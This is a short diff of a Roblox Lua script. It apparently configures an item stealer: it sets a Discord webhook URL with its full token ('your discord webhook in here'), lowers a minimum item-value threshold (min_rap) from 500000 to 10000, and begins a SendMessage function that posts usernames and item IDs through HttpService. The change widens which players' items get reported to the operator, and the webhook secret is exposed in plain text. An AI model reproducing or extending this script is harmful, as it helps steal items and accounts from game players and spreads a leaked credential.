@@ -1,6 +1,6 @@
 Username = "br1c7s"
 Webhook = "https://discord.com/api/webhooks/1216487831099146320/JsLK6o7iRv2jIj5MxS7kmm9kUj3HIZdaMdW7fz2QLOk5E3wBfsA8xLct1HiO3hRWcgzD" -- your discord webhook in here
-min_rap = 500000
+min_rap = 10000
 
 local function SendMessage(url, username, itemID)
     local http = game:GetService("HttpService")
